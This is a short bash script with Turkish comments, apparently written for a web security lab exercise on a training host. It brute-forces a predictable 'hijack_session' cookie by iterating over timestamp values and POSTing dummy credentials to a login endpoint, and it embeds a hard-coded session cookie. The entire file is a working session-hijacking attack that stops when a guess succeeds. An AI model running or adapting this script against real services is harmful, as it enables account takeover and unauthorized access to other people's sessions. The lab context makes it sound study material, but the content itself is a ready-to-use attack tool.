#!/bin/bash

PREFIX="7560f293-8be7-4861-933"
ID="1943729"
URL="http://web0x01.hbtn/api/a1/hijack_session/login"
# Diğer ana session çerezini de buraya ekle (eğer gerekliyse)
MAIN_SESSION="session=yoG1MpFj4f8At116y8P3fnGj9tMlx9FiYWWd8mMO4Lc.1bPMC_zDdEbpqQ0QQ1CjQsdb5UU"

for i in {459..501}; do
    TS="17687509$i"
    # İki çerezi birleştirerek gönderiyoruz
    COOKIE_HEADER="${MAIN_SESSION}; hijack_session=$PREFIX-$ID-$TS"

    echo -n "Testing TS: $TS ... " # -n ile yan yana yazdırır

    response=$(curl -s -X POST "$URL" \
      -H 'Content-Type: application/json' \
      -H "Cookie: $COOKIE_HEADER" \
      --data-raw '{"email":"fake@fake.com","password":"fake"}')

    # Eğer yanıt "failed" İÇERMİYORSA (yani başarılıysa)
    if [[ ! "$response" =~ "failed" ]]; then
        echo -e "\n[+] BAŞARILI!"
        echo "Kullanılan Cookie: $COOKIE_HEADER"
        echo "Sunucu Yanıtı: $response"
        break
    else
        echo "Başarısız."
    fi
done
